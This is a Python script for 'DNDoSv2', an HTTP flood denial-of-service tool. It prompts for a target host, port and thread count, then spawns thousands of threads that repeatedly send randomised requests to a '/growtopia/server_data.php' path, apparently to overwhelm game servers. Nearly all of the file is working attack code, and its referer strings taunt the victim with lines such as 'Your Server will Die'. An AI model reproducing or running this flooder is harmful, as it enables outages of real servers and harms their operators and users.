#This tool originally by PhynX
#Use At Your Own Risk.
# -*- coding: utf-8 -*-

import os, sys
import socket, socks, threading, random, re, os, ssl
from time import sleep
from os import system
from sys import stdout
from random import randint

asepall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
"Accept-Encoding: gzip, deflate\r\n", 
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept: text/html, application/xhtml+xml",
"Accept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]    

def peler():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title DNDoSv2")
    print('''
            ___  _  _ ___  ____ ____ 
            |  \ |\ | |  \ |  | [__  
            |__/ | \| |__/ |__| ___] v2
                            
                            By:PhynX
    ''')
    try:
        print("\n[+] Target : " +str(url))
    except:
        pass
    try:
        print("[+] Target Port : " +str(vport))
    except:
        pass

def ponik():
    global url, host_url
    peler()
    url = input("\n[+] Target [URL/IP] : ").strip()
    if url == "":
        ponik()
    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("Ngetik yg bener ngentd.")
        ponik()
    peler()
    try:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        host_url = url.replace("http://", "").replace("https://", "").split("/")[0]
    port()
    peler()

def port():
    global vport
    print("-----------------------------")
    vport = str(input("[+] Port [80]: "))
    if vport == '':
        if "https" in url:
                vport = int(443)
                print("[!] Selected Port 443")
        else:
            vport = int(80)
            print("[!] Selected Port 80")
    else:
        vport = int(vport)
    peju()

def peju():
    global threads
    try:
        print("-----------------------------")
        threads = int(input("[+] Threads [2000 - 6000]: "))
    except ValueError:
        threads = int(2000)
        print ("[!] Selected Threads " +str(threads)+ "\n")
    peler()
    nyerang()

def nyerang():
    global threads, get_host, connection, content, length, x
    x     = int(0)
    connection = "Connection: Keep-Alive\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    for x in range(threads):
        tembusbrokenhome(x+1).start()
    

class tembusbrokenhome(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error, i, mulai
        i = int(0)
        mulai = True
        useragent = "User-Agent: DNDoSv2" + "\r\n"
        asep    = random.choice(asepall)
        referer   = "Referer: " +random.choice(['DNDoSv2', 'PhynX Was Here', 'Your Server will Die', 'DNDOSV2']) + url+ "\r\n"
        get_host = random.choice(['GET','POST','HEAD'])+ " /growtopia/server_data.php " + random.choice(['HTTP/0.6', 'HTTP/0.9', 'HTTP/1.0', 'HTTP/1.1', 'HTTP/2.0']) + "\r\nHost: " +host_url+":"+str(vport)+ "\r\n"
        request  = get_host + useragent + asep + referer + content + length + "\r\n"
        while mulai:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(host_url), int(vport)))
                if str(port) == '443':
                    s = ssl.wrap_socket(s)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                i+=1
                print('[' + str(i) + '] Request Send.')
            except KeyboardInterrupt:
                mulai = False
                s.close()
                break
                print('Keyboard Interrupt, Closing DNDoSv2...')
                sys.exit()
            except:
                try:
                    s.close()
                except:
                    pass

if __name__ == '__main__':
    ponik()
